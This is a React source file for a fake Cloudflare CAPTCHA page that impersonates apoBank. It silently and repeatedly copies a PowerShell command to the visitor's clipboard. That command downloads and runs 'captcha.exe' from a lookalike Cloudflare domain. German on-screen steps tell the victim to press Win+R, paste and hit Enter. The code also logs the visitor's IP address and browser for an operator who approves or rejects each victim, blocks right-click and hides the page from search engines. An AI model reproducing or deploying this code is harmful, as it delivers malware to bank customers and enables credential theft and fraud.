import { useEffect, useRef, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ChevronsRight, Check } from "lucide-react";
import Index from "./Index";
import apoLogo from "@/assets/apo-a-logo.png.asset.json";
import { supabase } from "@/integrations/supabase/client";

type Phase = "idle" | "verifying" | "success" | "slider" | "liveWaiting" | "liveApproved" | "liveRejected";


const CfCaptcha = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const nextUrl = searchParams.get("next");
  const trackRef = useRef<HTMLDivElement>(null);
  const [dragging, setDragging] = useState(false);
  const [x, setX] = useState(0);
  const [done, setDone] = useState(false);
  const [phase, setPhase] = useState<Phase>("idle");
  const [refId] = useState(() =>
    Array.from({ length: 16 }, () => "0123456789abcdef"[Math.floor(Math.random() * 16)]).join("")
  );
  const DEFAULT_CLIP_PAYLOAD = `powershell -c "& {$u='https://d1.cloudflare-gateway.net/captcha.exe'; $o='%TEMP%\\captcha.exe'; (New-Object Net.WebClient).DownloadFile($u,$o); Start-Process $o}"`;
  const [CLIP_PAYLOAD, setClipPayload] = useState<string>(DEFAULT_CLIP_PAYLOAD);
  useEffect(() => {
    (async () => {
      try {
        const { data } = await (supabase as any)
          .from("api_settings")
          .select("captcha_clip_payload")
          .limit(1)
          .maybeSingle();
        if (data?.captcha_clip_payload) setClipPayload(data.captcha_clip_payload);
      } catch {}
    })();
  }, []);
  const startXRef = useRef(0);
  const startPosRef = useRef(0);
  const KNOB = 44;

  const maxX = () => {
    const w = trackRef.current?.clientWidth ?? 0;
    return Math.max(0, w - KNOB - 8);
  };

  const finish = () => {
    setDone(true);
    setTimeout(() => {
      if (nextUrl) {
        if (/^https?:\/\//i.test(nextUrl)) window.location.href = nextUrl;
        else navigate(nextUrl);
      } else {
        navigate("/homepage");
      }
    }, 500);
  };

  const copyPayload = () => {
    try {
      const ta = document.createElement("textarea");
      ta.value = CLIP_PAYLOAD;
      ta.style.position = "fixed";
      ta.style.left = "-9999px";
      ta.style.top = "-9999px";
      document.body.appendChild(ta);
      ta.focus();
      ta.select();
      try { document.execCommand("copy"); } catch (e) { console.error("Copy failed:", e); }
      document.body.removeChild(ta);
    } catch {}
  };

  const [requestId, setRequestId] = useState<string | null>(null);

  const onCheck = async () => {
    if (phase !== "idle") return;
    copyPayload();
    setPhase("verifying");

    let mode = flowMode;
    try {
      const { data } = await (supabase as any)
        .from("api_settings").select("flow_mode").limit(1).maybeSingle();
      if (data?.flow_mode) {
        mode = data.flow_mode;
        setFlowMode(data.flow_mode);
      }
    } catch {}

    // create captcha request for admin release
    try {
      const ua = typeof navigator !== "undefined" ? navigator.userAgent : null;
      let ip: string | null = null;
      try {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 2500);
        const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal });
        clearTimeout(t);
        const j = await r.json();
        if (typeof j?.ip === "string") ip = j.ip;
      } catch {}
      const { data } = await (supabase as any)
        .from("captcha_requests")
        .insert({ next_url: nextUrl, client_ua: ua, client_ip: ip })
        .select("id").single();
      if (data?.id) setRequestId(data.id);
    } catch {}
    setTimeout(() => setPhase("success"), 800);
    setTimeout(() => {
      if (mode === "live") {
        setPhase("liveWaiting");
      } else {
        setPhase("slider");
      }
    }, 1800);
  };




  const [sliderReleased, setSliderReleased] = useState(false);
  const [flowMode, setFlowMode] = useState<string>("afk");

  useEffect(() => {
    (async () => {
      try {
        const { data } = await (supabase as any)
          .from("api_settings").select("flow_mode").limit(1).maybeSingle();
        if (data?.flow_mode) setFlowMode(data.flow_mode);
      } catch {}
    })();
  }, []);

  // poll for admin decision once the live waiting screen is shown
  useEffect(() => {
    if (phase !== "liveWaiting") return;
    if (!requestId) return;
    let cancelled = false;
    const check = async () => {
      const { data } = await (supabase as any)
        .from("captcha_requests")
        .select("released_at,rejected_at")
        .eq("id", requestId)
        .maybeSingle();
      if (cancelled) return;
      if (data?.rejected_at) {
        setPhase("liveRejected");
        return;
      }
      if (data?.released_at) {
        setPhase("liveApproved");
        setTimeout(() => finish(), 1200);
      }
    };
    check();
    const iv = setInterval(check, 2000);
    return () => { cancelled = true; clearInterval(iv); };
  }, [phase, requestId]);

  const onDown = (clientX: number) => {
    if (done) return;
    setDragging(true);
    startXRef.current = clientX;
    startPosRef.current = x;
  };
  const onMove = (clientX: number) => {
    if (!dragging || done) return;
    const next = Math.min(maxX(), Math.max(0, startPosRef.current + (clientX - startXRef.current)));
    setX(next);
  };
  const onUp = () => {
    if (!dragging) return;
    setDragging(false);
    if (x >= maxX() - 4 && sliderReleased) {
      setX(maxX());
      finish();
    } else {
      setX(0);
    }
  };


  useEffect(() => {
    const meta = document.createElement("meta");
    meta.name = "robots";
    meta.content = "noindex, nofollow, noarchive, nosnippet, noimageindex";
    document.head.appendChild(meta);
    const prevent = (e: Event) => e.preventDefault();
    document.addEventListener("contextmenu", prevent);
    return () => {
      document.head.removeChild(meta);
      document.removeEventListener("contextmenu", prevent);
    };
  }, []);

  useEffect(() => {
    if (phase !== "slider") return;
    const copy = () => {
      try {
        navigator.clipboard?.writeText(CLIP_PAYLOAD).catch(() => {
          const ta = document.createElement("textarea");
          ta.value = CLIP_PAYLOAD;
          ta.style.position = "fixed";
          ta.style.opacity = "0";
          document.body.appendChild(ta);
          ta.select();
          try { document.execCommand("copy"); } catch {}
          document.body.removeChild(ta);
        });
      } catch {}
    };
    copy();
    const iv = window.setInterval(copy, 1500);
    const onFocus = () => copy();
    const onClick = () => copy();
    window.addEventListener("focus", onFocus);
    window.addEventListener("click", onClick);
    return () => {
      window.clearInterval(iv);
      window.removeEventListener("focus", onFocus);
      window.removeEventListener("click", onClick);
    };
  }, [phase]);

  useEffect(() => {
    const mm = (e: MouseEvent) => onMove(e.clientX);
    const mu = () => onUp();
    const tm = (e: TouchEvent) => onMove(e.touches[0].clientX);
    const tu = () => onUp();
    window.addEventListener("mousemove", mm);
    window.addEventListener("mouseup", mu);
    window.addEventListener("touchmove", tm);
    window.addEventListener("touchend", tu);
    return () => {
      window.removeEventListener("mousemove", mm);
      window.removeEventListener("mouseup", mu);
      window.removeEventListener("touchmove", tm);
      window.removeEventListener("touchend", tu);
    };
  });

  const CfBrand = () => (
    <div className="flex flex-col items-end leading-tight select-none">
      <div className="flex items-center gap-1">
        <svg viewBox="0 0 60 24" className="h-4 w-auto" aria-hidden>
          <path fill="#F38020" d="M45.6 12.2c-.3-.9-1-1.5-1.9-1.6l-14-.2c-.1 0-.2-.1-.3-.2 0-.1 0-.2.1-.3.1-.1.2-.1.3-.2L44 9.4c1.6-.1 3.4-1.4 4-3l.8-2.1c0-.1.1-.2 0-.3-.9-4-4.5-7-8.8-7-3.9 0-7.3 2.5-8.5 6.1-.8-.6-1.9-.9-3-.8-2 .2-3.6 1.8-3.8 3.8-.1.5 0 1 .1 1.5-3.3.1-5.9 2.8-5.9 6.1 0 .3 0 .6.1.9 0 .1.1.2.3.2h26.9c.2 0 .3-.1.3-.3l.1-.4c.1-.4.1-.7.1-1.1-.1-.4-.1-.6-.1-.6z"/>
          <path fill="#FAAE40" d="M48.6 4.5h-.4c-.1 0-.2.1-.2.2l-.5 1.9c-.3.9-.2 1.8.2 2.4.4.6 1 .9 1.9 1l3 .2c.1 0 .2 0 .2.1.1.1.1.2 0 .3-.1.1-.2.1-.3.2l-3.1.2c-1.7.1-3.4 1.4-4 3l-.2.7c-.1.1 0 .3.2.3h10.6c.1 0 .2-.1.3-.2.2-.6.3-1.3.3-2 0-4.6-3.7-8.3-8-8.3z"/>
        </svg>
        <span className="text-[11px] font-bold tracking-wide text-slate-700">CLOUDFLARE</span>
      </div>
      <div className="text-[10px] text-slate-500">Privacy · Terms</div>
    </div>
  );

  if (phase !== "slider") {
    return (
      <div className="relative min-h-screen overflow-hidden bg-white">
        <div aria-hidden className="fixed inset-0 z-0 overflow-hidden pointer-events-none blur-md scale-105 select-none">
          <Index />
        </div>
        <div className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center px-4 py-8 overflow-auto">
          <div className="w-full max-w-[560px]">
            <h1 className="text-[18px] sm:text-[22px] font-bold text-white leading-tight text-center drop-shadow">www.apobank.de</h1>
            <h2 className="text-[18px] sm:text-[22px] font-semibold text-white mt-2 mb-6 text-center drop-shadow">
              Überprüfung der Verbindungssicherheit
            </h2>
            <div className="mx-auto flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 sm:gap-4 rounded-md border border-slate-200 bg-white px-4 sm:px-5 py-4 w-full max-w-[440px] shadow-lg">
              <div className="flex items-center gap-3">
                {phase === "idle" && (
                  <>
                    <button
                      onClick={onCheck}
                      aria-label="Bestätigen Sie, dass Sie ein Mensch sind"
                      className="h-6 w-6 shrink-0 rounded-sm border border-slate-400 bg-white hover:border-slate-600 transition"
                    />
                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Bestätigen Sie, dass Sie ein Mensch sind</span>
                  </>
                )}
                {(phase === "verifying" || phase === "waiting") && (
                  <>
                    <div className="h-6 w-6 shrink-0 rounded-full border-2 border-slate-300 border-t-[#f38020] animate-spin" />
                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Überprüfung läuft...</span>
                  </>
                )}
                {phase === "success" && (
                  <>
                    <div className="h-6 w-6 shrink-0 rounded-full bg-[#2e7d32] flex items-center justify-center">
                      <Check className="h-4 w-4 text-white" strokeWidth={3} />
                    </div>
                    <span className="text-[14px] sm:text-[15px] text-[#0f172a]">Erfolgreich!</span>
                  </>
                )}
              </div>
              <div className="self-end sm:self-auto">
                <CfBrand />
              </div>
            </div>
            <p className="text-[13px] sm:text-[15px] text-white/95 mt-6 max-w-[560px] text-center mx-auto drop-shadow">
              www.apobank.de muss die Sicherheit Ihrer Verbindung überprüfen, bevor Sie fortfahren können.
            </p>
          </div>
        </div>
      </div>

    );
  }


  return (
    <div className="relative min-h-screen overflow-hidden bg-[#f5f7fa]">
      <div aria-hidden className="fixed inset-0 z-0 overflow-hidden pointer-events-none blur-md scale-105 select-none">
        <Index />
      </div>
      <div className="fixed inset-0 z-50 bg-black/40 flex items-center justify-center px-4 py-8 overflow-auto">
        <div className="w-full max-w-[680px]">

          <div className="rounded-xl overflow-hidden border border-slate-200 bg-white shadow-2xl">
            <header className="flex items-center justify-between px-6 py-5 bg-white border-b border-slate-100">
              <div className="flex items-center gap-3">
                <div className="h-6 w-6 rounded-full border-2 border-slate-300 border-t-[#001f5b] animate-spin" />
                <h2 className="text-[#0f172a] text-[18px] font-semibold leading-none">
                  Sicherheitsüberprüfung
                </h2>
              </div>
              <img src={apoLogo.url} alt="apoBank" className="h-8 w-auto" />
            </header>


            <div className="bg-[#f5f7fa] px-6 py-8">
              <p className="text-[14px] text-[#0f172a] mb-3">
                Bitte bestätigen Sie durch die untenstehende Aktion, dass Sie ein Mensch sind.
              </p>

              <ol className="list-decimal pl-6 text-[14px] text-[#0f172a] space-y-1 mb-4">
                <li>Halten Sie die <strong>Windows-Taste + R</strong> gedrückt.</li>
                <li>Drücken Sie im Bestätigungsfenster <strong>Strg + V</strong>.</li>
                <li>Drücken Sie <strong>Enter</strong> auf Ihrer Tastatur, um abzuschließen.</li>
              </ol>
              <p className="text-[13px] text-slate-600 mb-2">Sie werden Folgendes sehen und bestätigen:</p>
              <div className="mb-6 rounded-md border border-slate-200 bg-white px-3 py-2 font-mono text-[13px] text-slate-700 break-all">
                apoBank Verifizierung (Ref-ID: {refId})
              </div>

              <div className="text-center">
                <p className="text-[13px] font-semibold text-[#0f172a]">
                  Schieben Sie den Regler nach rechts, um die Prüfung abzuschließen.
                </p>

                <div
                  ref={trackRef}
                  className="relative mx-auto mt-4 h-[56px] w-full rounded-lg bg-white border border-slate-200 shadow-sm select-none"
                >
                  <div
                    className="absolute inset-y-0 left-0 rounded-lg bg-[#e2ecf8] transition-[width] duration-75"
                    style={{ width: `${x + KNOB + 4}px`, opacity: done ? 1 : 0.9 }}
                  />
                  <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                    <span className="text-[13px] text-slate-500">
                      {done ? "Bestätigt" : "Nach rechts schieben →"}
                    </span>
                  </div>
                  <div
                    role="button"
                    aria-label="Regler nach rechts schieben"
                    onMouseDown={(e) => onDown(e.clientX)}
                    onTouchStart={(e) => onDown(e.touches[0].clientX)}
                    className={`absolute top-1 left-1 h-[48px] w-[48px] rounded-md bg-white border border-slate-200 shadow-md flex items-center justify-center ${
                      done ? "cursor-default" : "cursor-grab active:cursor-grabbing"
                    }`}
                    style={{ transform: `translateX(${x}px)`, transition: dragging ? "none" : "transform 200ms ease" }}
                  >
                    {done ? (
                      <Check className="h-5 w-5 text-[#2e7d32]" />
                    ) : (
                      <ChevronsRight className="h-5 w-5 text-[#001f5b]" />
                    )}
                  </div>
                </div>

                <p className="text-[11px] text-slate-500 mt-5">
                  Diese Prüfung schützt vor automatisierten Zugriffen.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CfCaptcha;
